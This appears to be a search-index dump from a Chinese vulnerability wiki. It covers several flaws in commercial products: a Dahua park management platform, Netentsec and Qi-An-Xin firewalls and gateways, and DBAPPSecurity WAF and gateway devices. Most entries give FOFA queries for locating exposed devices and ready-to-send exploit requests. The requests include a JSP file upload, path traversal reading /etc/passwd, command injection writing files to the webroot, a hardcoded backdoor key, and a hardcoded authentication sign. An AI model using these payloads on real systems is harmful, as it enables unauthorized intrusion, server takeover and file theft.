","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-video-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-video-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 大华 智慧园区综合管理平台 ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-video-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-video-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"dahua-智慧园区综合管理平台\" ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-video-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-video-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC POST /publishing/publishing/material/file/video HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 804 Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7 Accept-Encoding: gzip, deflate Connection: close --dd8f988919484abab3816881c55272a7 Content-Disposition: form-data; name=\"Filedata\"; filename=\"Test.jsp\" Test --dd8f988919484abab3816881c55272a7 Content-Disposition: form-data; name=\"Submit\" submit --dd8f988919484abab3816881c55272a7-- 访问： /publishingImg/VIDEO/230812152005170200.jsp ","date":"0001-01-01","objectID":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-video-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-video-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网康 NS-ASG安全网关 cert_download.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 网康 NS-ASG安全网关 cert_download.php 文件存在任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 网康 NS-ASG安全网关 ","date":"0001-01-01","objectID":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 网康 NS-ASG安全网关 ","date":"0001-01-01","objectID":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 出现漏洞的文件为 /admin/cert_download.php ![2](C:\\Users\\47236\\Desktop\\2.png)\u003c?php $filename = substr($file,strpos('certs/',$certfile)+6); //文件的类型 header('Content-type: application/pdf'); //下载显示的名字 header('Content-Disposition: attachment; filename=\"'.$filename.'\"'); readfile(\"$certfile\"); exit(); ?\u003e 此文件没有对身份进行校验即可下载任意文件 /admin/cert_download.php?file=test.txt\u0026certfile=../../../../../../../../etc/passwd /admin/cert_download.php?file=test.txt\u0026certfile=cert_download.php ","date":"0001-01-01","objectID":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-ns-asg%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-cert_download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"奇安信网康 下一代防火墙 router 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 奇安信 网康下一代防火墙存在远程命令执行，通过漏洞攻击者可以获取服务器权限 ","date":"0001-01-01","objectID":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 奇安信 网康下一代防火墙 ","date":"0001-01-01","objectID":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"网康科技-下一代防火墙\" ","date":"0001-01-01","objectID":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 发送如下请求包 ![2](C:\\Users\\47236\\Desktop\\2.png)POST /directdata/direct/router HTTP/1.1 Host: XXX.XXX.XXX.XXX Connection: close Content-Length: 179 Cache-Control: max-age=0 sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Content-Type: application/json Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 {\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt;cat /etc/passwd \u003e/var/www/html/test_cmd.txt\"]}],\"type\":\"rpc\",\"tid\":17,\"f8839p7rqtj\":\"=\"} 再请求获取命令执行结果 http://xxx.xxx.xxx.xxxx/test_cmd.txt ","date":"0001-01-01","objectID":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%A5%87%E5%AE%89%E4%BF%A1-%E7%BD%91%E5%BA%B7-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-router-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"安恒 明御WEB应用防火墙 report.php 任意用户登录漏洞 ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99-report.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99-report.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 安恒 明御WEB应用防火墙 report.php文件存在硬编码设置的Console用户登录，攻击者可以通过漏洞直接登录后台 ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99-report.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99-report.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 安恒 明御WEB应用防火墙 ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99-report.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99-report.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"安恒信息-明御WAF\" ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99-report.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99-report.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /report.m?a=rpc-timed 再访问主页面跳转配置页面 发送请求包配置系统SSH等 POST /system.m?a=reserved key=!@#dbapp-waf-dev-reserved#@! ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99-report.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99-report.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"安恒 明御安全网关 aaa_portal_auth_local_submit 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-aaa_portal_auth_local_submit-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-aaa_portal_auth_local_submit-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 安恒 明御安全网关 aaa_portal_auth_local_submit 存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限 ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-aaa_portal_auth_local_submit-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-aaa_portal_auth_local_submit-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 安恒 明御安全网关 ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-aaa_portal_auth_local_submit-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-aaa_portal_auth_local_submit-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"/webui/images/basic/login/\" \u0026\u0026 title==\"明御安全网关\" ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-aaa_portal_auth_local_submit-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-aaa_portal_auth_local_submit-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC GET /webui/?g=aaa_portal_auth_local_submit\u0026bkg_flag=0\u0026suffix={{urlenc(`id \u003e/usr/local/webui/test.txt`)}} HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36 Connection: close Accept: */* Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip /test.txt ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-aaa_portal_auth_local_submit-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-aaa_portal_auth_local_submit-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"安恒 明御安全网关 命令执行 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 安恒信息明御安全网关存在命令执行漏洞，导致攻击者可以直接执行系统命令，从而控制目标系统。 ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞分析 参考阅读： https://r0fus0d.blog.ffffffff0x.com/post/oem-case/ ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"命令执行 1 漏洞 URL： /webui/?g=aaa_portal_auth_local_submit\u0026suffix= poc： /webui/?g=aaa_portal_auth_local_submit\u0026suffix=%0aecho%20%27%3C%3Fphp%20echo%20%22test%20-%20Open%20source%20project%20%28github.com%2Ftest%2Ftest%29%22%3B%20phpinfo%28%29%3B%20%3F%3E%27%20%3E%3E%20%2Fusr%2Flocal%2Fwebui%2F111111112.php\u0026bkg_flag=0 ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:1","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"命令执行 2 漏洞 URL： /webui/?g=aaa_portal_auth_config_reset\u0026type= poc： /webui/?g=aaa_portal_auth_config_reset\u0026type=%0aecho%20%27%3C%3Fphp%20echo%20%22test%20-%20Open%20source%20project%20%28github.com%2Ftest%2Ftest%29%22%3B%20phpinfo%28%29%3B%20%3F%3E%27%20%3E%3E%20%2Fusr%2Flocal%2Fwebui%2F111111111.php%0a ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:2","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"任意文件读取 poc： requests: - method: GET path: - \"{{BaseURL}}/webui/?g=sys_dia_data_down\u0026file_name=../etc/passwd\" - \"{{BaseURL}}/webui/?g=sys_dia_data_check\u0026file_name=../../../../../../../../etc/passwd\" - \"{{BaseURL}}/webui/?g=sys_capture_file_download\u0026name=../../../../../../../../etc/passwd\" - \"{{BaseURL}}/webui/?g=sys_corefile_sysinfo_download\u0026name=../../../../../../../../etc/passwd\" ","date":"0001-01-01","objectID":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:3","tags":null,"title":"","uri":"/%E5%AE%89%E6%81%92-%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"验证码绕过 poc： /remote_auth.php?user=admin\u0026pwd=admin\u0026sign=ba84d9dd91eb304aca57f0a8f052623e 其中 sign 硬编码在 /usr/local/webui/remote_auth.php 中： if($_GET['user']!=null) $usr = formatget($_GET['user']); if($_GET['pwd']!=null) $pwd = formatget($_GET['pwd']); if($_GET['sign']!=null) $sign = formatget($_GET['sign']); $key= 'saplingos!@#$%^\u0026*';//这个key你们协商后保存一致即可 //ba84d9dd91eb304aca57f0a8f052623e if(empty($usr)){ die('user_null'); } else if(empty($pwd)){ die('pwd_null'); } else if (!$sign){ die('sign_null'); } else if ($sign != md5($key)){ die('sign_error'); } else{ if (isset($usr, $pwd)) { LoginHandler::login($usr, $pwd, $num,'',$remote_auth = true); } $fail_msg = ''; if (LoginHandler::isLoginFail()) { $fail_msg = $_SESSION[ERROR_STR]; if (strlen($fail_msg) \u003c= 0) { $fail_msg = LocalUtil::getCommonResource('login_failed'); } die($fail_msg); } } 可以通过任意文件读取漏洞读取 key，然后进行爆破。 